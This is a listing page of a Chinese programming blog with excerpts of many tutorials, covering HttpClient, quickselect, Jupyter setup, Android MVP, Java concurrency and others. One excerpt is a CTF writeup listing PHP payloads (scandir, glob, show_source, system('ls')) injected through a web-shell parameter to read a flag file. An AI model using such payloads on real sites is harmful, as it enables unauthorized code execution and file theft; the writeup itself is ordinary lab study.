		<h2 class="list__title post__title">
			<a href="/posts/fa824bb27688423281334c348a8630d6/" rel="bookmark">
			.NET MVC4 用HttpClient后台post 请求webapi
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载：https://blog.csdn.net/Anlan2010/article/details/49445905
public ActionResult Index()
{
var requestJson = JsonConvert.SerializeObject("[{'CityId':18,'CityName':'西安','ProvinceId':27,'CityOrder':1},{'CityId':53,'CityName':'广州','ProvinceId':27,'CityOrder':1}]");
HttpContent httpContent = new StringContent(requestJson);
httpContent.Headers.ContentType = new MediaTypeHeaderValue("application/json");
var httpClient = new HttpClient();
var responseJson = httpClient.PostAsync("http://localhost:6972/api/test/Post/", httpContent)
.Result.Content.ReadAsStringAsync().Result;
ViewBag.s = responseJson;
return View();
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f541e4b3fc14249052e0cd0c80ef5d8f/" rel="bookmark">
			线性时间选择
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：给定线性序集中n个元素和一个整数k，1&lt;=k&lt;=n，要求找出这n个元素中第k小的元素。
我们采用快速排序的思想来解决这个问题。首先我们要找到基准的位置，如果基准的位置小于k，则表示第k小的元素在基准的后面，否则在基准的前面。
如果能在线性时间内找到一个划分基准，使得按这个基准所划分出的2个子数组的长度都至少为原数组长度的 ε 倍（0&lt;ε&lt;1是某个常数），那么就可以在最坏情况下用O(n)时间完成选择任务。
算法过程如下：
将这个函数定义为select(nums,p,r,k)，即为找到nums[p:r]数组中第k（1&lt;=k&lt;=n）小的元素。假如数组的长度小于75，那么直接用快排来解决。将n个输入元素划分成ceil(n/5)个组，每组5个元素，只可能有一个组不是5个元素。用任意一种排序算法，将每组中的元素排好序，并取出每组的中位数，共ceil(n/5)个。递归调用select来找出这ceil(n/5)个元素的中位数。如果ceil(n/5)是偶数，就找它的2个中位数中较大的一个。以这个元素作为划分基准。 //一次快排 int Partition(int nums[],int p,int r,int x) { if(p&gt;r) return -1; //找出基准x的位置并与第一位交换 for(int i=p;i&lt;=r;i++) { if(nums[i]==x) { swap(x,nums[p]); break; } } int left=p,right=r; while(left&lt;right) { while(left&lt;right &amp;&amp; nums[right]&gt;=x) right--; nums[left]=nums[right]; while(left&lt;right &amp;&amp; nums[left]&lt;x) left++; nums[right]=nums[left]; } nums[left]=x; return left; } //快速排序 void QuickSort(int nums[],int low,int high) { if(low&gt;high) return; int key=nums[low]; int left=low,right=high; while(left&lt;right) { while(left&lt;right &amp;&amp; nums[right]&gt;=key) right--; nums[left]=nums[right]; while(left&lt;right &amp;&amp; nums[left]&lt;key) left++; nums[right]=nums[left]; } nums[left]=key; QuickSort(nums,low,left-1); QuickSort(nums,left+1,high); } int Select(int nums[],int p,int r,int k) { if(r-p&lt;75) { QuickSort(nums,p,r); return nums[p+k-1]; } //每5个为一组，找到各组的中位数，并存储在前(r-p-4)/5个位置里	for(int i=0;i&lt;=(r-p-4)/5;i++) { QuickSort(nums,p+5*i,p+5*i+4); swap(nums[p+i],nums[p+5*i+2]); } //找所有中位数的中位数 int x=Select(nums,p,p+(r-p-4)/5,(r-p-4)/10); //以x为基准做一次快排 int i=Partition(nums,p,r,x); int j=i-p+1; //判断k属于那个部分 if(k&lt;=j) return Select(nums,p,i,k); else return Select(nums,i+1,r,k-j); } 为什么是线性时间呢？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f541e4b3fc14249052e0cd0c80ef5d8f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20c7f007447e727e3000019c62b5cafe/" rel="bookmark">
			Python实现&#34;2的幂&#34;的两种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个整数，写一个函数来判断它是否为2的幂次方
示例 1:
输入: 1 输出: true 解释: 20 = 1 示例 2:
输入: 16 输出: true 解释: 24 = 16 示例 3:
输入: 218 输出: false 1：while循环判断，注意整数为"0"的测试用例 def isPowerOfTwo(self, n): """ :type n: int :rtype: bool """ if n == 0: return False while n%2 == 0: n = n/2 if n == 1: return True else: return False 2：&amp;位与运算（参考他人） def isPowerOfTwo(self, n): """ :type n: int :rtype: bool "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20c7f007447e727e3000019c62b5cafe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3260c4af5d47c1b5d4b6dc1fdf153d8/" rel="bookmark">
			根据手机壳颜色改变app主题？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		扫个二维码，直接体验。??项目地址
效果如下图
这里颜色提取使用了开源项目color-thief, 其中算法部分使用了 Leptonica color-quantization 中用到的（调整）中位切分法（MMCQ, modified median cut quantization），有兴趣的朋友可以看看。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9fee3ea1f6c821b8eb51433fa666983/" rel="bookmark">
			使用NuGet快速搭建LearnOpenGL环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vs工具-&gt;NuGet包管理器-&gt;管理解决方案的NuGet程序包
找这三个包并安装：NupenGL.Core glm assimp
项目属性-&gt;链接-&gt;输入-&gt;添加OpenGL32.lib（因为在系统目录，不在包里，要另外加
新建main.cpp，去下面的网页复制代码
https://learnopengl.com/code_viewer.php?code=getting-started/hellowindow2
删掉 glewExperimental = GL_TRUE;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3da189cfd21c9b4404422786061d539/" rel="bookmark">
			配置jupyter notebook全步骤，更改默认路径，jupyter不是
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一次打开anaconda中自带的jupyter notebook，默认路径都是C:\Users\Admin(自己的用户名)，需要更换成自己的工作路径。虽然网上很多此类文章，可多数只讲了一部分，需要翻很多文章才能看懂，我把所有需要注意的步骤放在一起，查遗补漏就知道自己缺在哪一步了。
先看下修改之后三种不同方式打开jupyter notebook的结果。
1、从左下角程序快捷启动
2、从cmd启动
3、从D盘安装的scripts文件夹中启动程序
我们一步步来看下配置jupyter notebook全步骤。
1、新建一个jupyter-notebook的文件夹
操作的目的是以后启动jupyter notebook打开的都是这个文件夹。
我的操作：我在E盘新建文件夹”jupyter-notebook“，路径位E:\jupyter-notebook
2、生成jupyter_notebook_config.py文件
流程：打开调出命令提示符cmd → 输入“jupyter notebook --generate-config”（注意没有引号）生成文件，打开C盘下jupyter文件夹查看是否生成成功，
我的操作：在C:\Users\Administrator.jupyter下没有生成之前只有一个migrated文件。
3、接步骤2，修改config路径
打开刚生成的jupyter_notebook_config.py文件，找到这一行#c.NotebookApp.notebook_dir = ’ '，将步骤1生成的路径添加上去，c.NotebookApp.notebook_dir = ‘(自己的路径)’，注意一定要去掉前面的#。
我的操作：将214行 #c.NotebookApp.notebook_dir = ’ ’ 修改为 c.NotebookApp.notebook_dir = ‘E:\jupyter-notebook’。
4、添加环境变量
操作流程（以win10为例）：此电脑→右键→属性→更改设置→高级→环境变量→双击path→新建→ 将安装anaconda路径下的Scripts路径复制过来(这是jupyter-notebook.exe的路径。
我的操作： 比如我的是路径D:\install\anaconda\Scripts
5、修改开始菜单中Jupyter Notebook的快捷方式
操作流程（以win10为例）：程序→Anaconda→ Jupyter Notebook→ 右键→ 属性→ 快捷方式→ 去掉“目标”一项中后面的" %USERPROFILE%" 。
我的操作
好了，对照以上5步，检查下自己的路径是否配置正确，是不是也不再跳出“Jupyter不是内部或外部命令也不是可运行的程序或批处理 ”的提示了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a5d7e8f20d409266eb0e3e0f23bce87/" rel="bookmark">
			C&#43;&#43;基础之string类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++基础之string类型 string 类型支持长度可变的字符串，C++ 标准库将负责管理与存储字符相关的内存，以及提供各种有用的操作。标准库 string 类型的目的就是满足对字符串的一般应用。
与其他的标准库类型一样，用户程序要使用 string 类型对象，必须包含相关头文件。如果提供了合适的 using 声明，那么编写出来的程序将会变得简短些：
#include &lt;string&gt; using std::string; string 对象的定义和初始化 string 标准库支持几个构造函数。构造函数是一个特殊成员函数，定义如何初始化该类型的对象。下面列出了几个 string 类型常用的构造函数。当没有明确指定对象初始化式时，系统将使用默认构造函数。
string s1;默认构造函数 s1 为空串string s2(s1);将 s2 初始化为 s1 的一个副本string s3(“value”);将 s3 初始化为一个字符串字面值副本string s4(n, ‘c’);将 s4 初始化为字符 ‘c’ 的 n 个副本 PS：因为历史原因以及为了与 C 语言兼容，字符串字面值与标准库 string 类型不是同一种类型。这一点很容易引起混乱，编程时一定要注意区分字符串字面值和 string 数据类型的使用，这很重要。
string 对象的读写 int main() { string s;	//定义一个空字符串 cin &gt;&gt; s;	//从标准输入读取 string 并将读入的串存储在 s 中 cout &lt;&lt; s &lt;&lt; endl;	return 0; } PS:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a5d7e8f20d409266eb0e3e0f23bce87/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a8e7c5fdff10ba98a82dbed45d73f41/" rel="bookmark">
			Android的碎片fragment和activity之前的关系 以及MVP模式详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考原文：https://www.jianshu.com/p/bbb3b77d47eb
GoogleMVP机制：https://blog.csdn.net/jungle_pig/article/details/65626469
1、activity与fragment传值
当activity动态加载fragment时可以通过fragment的setArguments()传入值；
在fragment类中通过fragment的getArguments()方法获得传入的值 ；
MVP结构图：
参考原文：https://blog.csdn.net/swust_zeng_zhuo_k/article/details/78760947 创建MVP模式是需要经过一下几个步骤： 1、创建IPresenter接口，把所有的业务逻辑的接口搜放在这里，并创建他的实现PresenterImpl, 2、创建IView接口，把所有的视图逻辑的接口都放在这里，其实现类是Activity/Fragment 3、由UML试图可以看出，Activity包含了一个IPresenter，而PresenterImpl包含了IVew并依赖了Model, Activity只保留了对IPresenter的调用，其他的都放在PresenterImpl中实现， 4、model并不是必须有的，但是一定会有Presenter和View 注意：虚线三角箭头：实现；虚线箭头：依赖； 实线三角：关联
Google提出的一种MVP实现方式，步骤：
1.BasePresenter
2.BaseView
两个接口分别作为Presenter和View的基类，仅定义了最基本的方法，具体页面的view和presenter则分别定义继承的接口，添加属于自己页面的方法。
3.Contract 契约类
这是Google MVP与其他实现方式的不同之一，契约类用于定义同一个界面的view和presenter的接口，通过规范的方法命名或注释，可以清晰的看到整个页面的逻辑。
4.具体的Impl类
Fragment实现View接口，这里使用Google推荐的创建Fragment实例的static方法newInstance()，将fragment必备的参数传入。
Presenter实现类，提供一个参数为对应View的构造器，持有View的引用，并调用View的setPresenter()方法，让View也持有Presenter的引用，方便View调用Presenter的方法。
5.最后就是Activity
创建view以及presenter实例，并将二者联系起来。
下图是Google官方Demo：todo-mvp模式的架构图
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/853c5145860529591f98e9bba60c765b/" rel="bookmark">
			Visual Studio 2017安装时共享组件、工具和 SDK安装位置不能更改的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于Visual Studio 2017安装时共享组件、工具和 SDK安装位置不能更改的问题 有时候，Visual Studio可能会出现问题，也可能会因为其他一些原因需要重新安装VS，但是VS的卸载一直是个非常大的问题就是卸载不干净，会残留各种组建和注册表什么的（听说2019可能会改善卸载方面），2017还好点，其它版本问题更甚。
记得之前因为整理了硬盘的文件，将一些文件归类，改变了文件以及文件夹的路径导致VS的缓存包无法引用，网上找这方面的解决方法，但是没有找到，后来自己动手，直接用原来的路径索引所有的注册表。。。。。。
这次因为系统问题，需要重新安装VS，但是中途出现了问题打断了，后来安装的时候一直出现路径无法更改的问题，网上找了找，号称国内搜索老大的某度压根搜不到，后开还是借助Google找到了有类似问题的帖子，微软官方的答案也是因为VS卸载不干净导致的（不知道他们这么回答的时候，心里会不会难过。。。。。。），但是官方没有给出具体的注册表信息，国内的一些网友动不动就用万能的“重装系统”来回答这类问题！后来还是借用之前的方法，直接索引注册表，果然找到了，就一个注册表信息，删除以后问题解决！希望可以给许多的人提供参考！
删除注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\VisualStudio\Setup下的SharedInstallationPath项。
当然，有些人可能会搜索VisualStudio信息然后全部删除，但是这种做法可能会带来其他一些问题，所以，这种做法是最安全的了（哪里有问题，就解决哪里）！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/082e7797a68438d4205788406f68bd48/" rel="bookmark">
			ArcGIS核密度分析原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		核密度分析： 使用核函数根据点或折线 (polyline) 要素计算每单位面积的量值以将各个点或折线 (polyline) 拟合为光滑锥状表面。
核密度分析所用到的参数： 输入点或折线要素
要计算密度的输入要素（点或线）。
Population 字段
表示各要素的 population 值的字段。Population 字段表示遍布于用来创建连续表面的景观内的计数或数量。
population 字段的值可以是整型或浮点型。
以下列出的是该字段的选项和默认特性。
如果不使用任何项目或特殊值，则选择 None，这样每一要素就只计数一次。
如果输入要素包含 Z，则可以使用 形状。
否则，默认字段为 POPULATION。以下条件同样适用。
如没有 POPULATION 字段，但是存在 POPULATIONxxxx 字段，默认使用此字段。“xxxx”可以为任何有效字符，例如 POPULATION6、POPULATION1974 或 POPULATIONROADTYPE。如没有 POPULATION 字段或 POPULATIONxxxx 字段，但是存在 POP 字段，默认使用此字段。如没有 POPULATION、POPULATIONxxxx 或 POP 字段，但是存在 POPxxxx 字段，默认使用此字段。如没有 POPULATION、POPULATIONxxxx、POP 或 POPxxxx 字段，则默认使用 NONE。 输出栅格
输出核密度栅格。
其总为浮点栅格。
输出像元大小 (可选)
输出栅格数据集的像元大小。
如果专门进行设置，则是环境中的值。如果未设置环境，单元大小为输出空间参考中输出范围的宽度或高度较小值除以 250。
搜索半径 (可选)
在其范围内计算密度的搜索半径。单位基于输出空间参考投影的线性单位。
例如，如果单位为米，若要包含一英里邻域内的所有要素，可将搜索半径设置为 1609.344（1 英里 = 1609.344 米）。
默认值为输出空间参考中输出范围的宽度或高度的最小值除以 30。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/082e7797a68438d4205788406f68bd48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad0f26ca0d371f8f83230d8c25574c0d/" rel="bookmark">
			Java 并发控制实例 （银行问题取钱存钱）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		并发主要的就是解决同步问题。
如果数据不同步，如假设A的银行余额为500。A用网银取了500，同时用ATM机取了500，那A将会有概率总共取得1000（因为网银与ATM是独立的，出现网银取钱了，但还未扣款，或者扣了钱但数据还没反馈到总服务器，然后ATM的得的数据还是原来的数据，即余额任然为500，所以依然可以取出500,500+500=1000）.
所以需要并发控制来解决问题，此实例采用Java 中 的 synchroniezd实现同步
package com.asmn.bank; import static com.asmn.tools.Tools.*; public class Main { public static void main(String[] args) { //初始余额为500 Bank bank = new Bank(500); char []names = "ABCDEF".toCharArray(); for(char name : names){ new Thread(new reduce(bank,name,50)).start(); } for(char name : names){ new Thread(new Add(bank,name,50)).start(); } } } class Add implements Runnable { private Bank bank; private int sum; private char name; public Add(Bank bank, char name, int sum){ this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad0f26ca0d371f8f83230d8c25574c0d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a28db315613690dd8e860f1754144c9/" rel="bookmark">
			El表达式获取request的attribute跟parameter的值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		假设请求url是get请求
url=http://localhost:9081/spring-mybatis-mysql/emp/testCookieAndSession.do?id=12345;
请求里做以下处理，这里是springmvc的请求，servlet请求也一样
// An highlighted block @RequestMapping(value="/testCookieAndSession.do") public String testCookieAndSession(Model model,YuanGong yuangong,Date date,HttpServletRequest request,HttpServletResponse response) throws Exception{ request.setAttribute("name1", "whj"); Person p=new Person(); p.setName("aaasddwdwd"); request.setAttribute("p", p); return "success";//类似于servelet的	request.getRequestDispatcher("/success").forward(request, response); } 然后调到success.jsp页面。当前我们知道request的parameter里面有一个id
attribute里面有name1跟一个对象person。person对象里面的name被set为aaasddwdwd，那么如何用el拿到这两个值呢
如果单纯的在jsp页面写java代码拿的话咱们一般是这么写：
&lt;% String id=request.getParameter("id"); Person p=(Person )request.getAttribute("p"); String name=p.getName(); String name1=(String)request.getAttribute("name1"); %&gt; el写法有如下
// An highlighted block ${param.id}&lt;br/&gt; ${name1}&lt;br/&gt; ${resultScope.name1}&lt;br/&gt; ${p.name}&lt;br/&gt; ${p.getName()}&lt;br/&gt; ${resultScope.p.name}&lt;br/&gt; ${resultScope.p.getName()}&lt;br/&gt; 想验证的同学验证一下如果有错误请指出
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e868c10192e3974723d2baccb708e12/" rel="bookmark">
			深度有趣 | 30 快速图像风格迁移
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 使用TensorFlow实现快速图像风格迁移（Fast Neural Style Transfer）
原理 在之前介绍的图像风格迁移中，我们根据内容图片和风格图片优化输入图片，使得内容损失函数和风格损失函数尽可能小
和DeepDream一样，属于网络参数不变，根据损失函数调整输入数据，因此每生成一张图片都相当于训练一个模型，需要很长时间
训练模型需要很长时间，而使用训练好的模型进行推断则很快
使用快速图像风格迁移可大大缩短生成一张迁移图片所需的时间，其模型结构如下，包括转换网络和损失网络
风格图片是固定的，而内容图片是可变的输入，因此以上模型用于将任意图片快速转换为指定风格的图片
转换网络：参数需要训练，将内容图片转换成迁移图片损失网络：计算迁移图片和风格图片之间的风格损失，以及迁移图片和原始内容图片之间的内容损失 经过训练后，转换网络所生成的迁移图片，在内容上和输入的内容图片相似，在风格上和指定的风格图片相似
进行推断时，仅使用转换网络，输入内容图片，即可得到对应的迁移图片
如果有多个风格图片，对每个风格分别训练一个模型即可
实现 基于以下两个项目进行修改，github.com/lengstrom/f…、github.com/hzy46/fast-…
依然通过之前用过的imagenet-vgg-verydeep-19.mat计算内容损失函数和风格损失函数
需要一些图片作为输入的内容图片，对图片具体内容没有任何要求，也不需要任何标注，这里选择使用MSCOCO数据集的train2014部分，cocodataset.org/#download，共82612张图片
加载库
# -*- coding: utf-8 -*- import tensorflow as tf import numpy as np import cv2 from imageio import imread, imsave import scipy.io import os import glob from tqdm import tqdm import matplotlib.pyplot as plt %matplotlib inline 复制代码 查看风格图片，共10张
style_images = glob.glob('styles/*.jpg') print(style_images) 复制代码 加载内容图片，去掉黑白图片，处理成指定大小，暂时不进行归一化，像素值范围为0至255之间
def resize_and_crop(image, image_size): h = image.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e868c10192e3974723d2baccb708e12/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b27b11df68ce3906827b16d697a240e/" rel="bookmark">
			bugku 过狗一句话 writeup
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考：https://blog.csdn.net/qq_30464257/article/details/81160181
PHP file_get_contents() 函数 例子 &lt;?php echo file_get_contents("test.txt"); ?&gt; 输出：
This is a test file with test text. 首先将s赋值为phpinfo(),发现可以访问，说明s可以输出我们输入的结果
搜索到的几种解法：
1. s=print_r(scandir('./')) 然后读取fl4g.txt
2. s=print_r(glob("*.*")) 然后读取show_source("fl4g.txt")
3. 使用file_get_contents("flag.txt")读取文件
eg: 还有system('ls')的读取方法但是这里应该没有权限.
用的print_r(glob('*.php'));读取敏感文件
print_r(glob('*.txt'))
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bedf65a31478fd4986731e815ab6c114/" rel="bookmark">
			Windows server 2012将远程用户限制到单独的远程桌面会话解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在计算机本地组策略里选择计算机配置-管理模板-windows组件-远程桌面服务-远程桌面会话主机-连接，找到 “将远程桌面服务用户限制到单独的远程桌面”设置已禁用
在运行里输入”gpupdate /force”,强制执行本地组策略
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/246/">«</a>
	<span class="pagination__item pagination__item--current">247/279</span>
	<a class="pagination__item pagination__item--next btn" href="/page/248/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>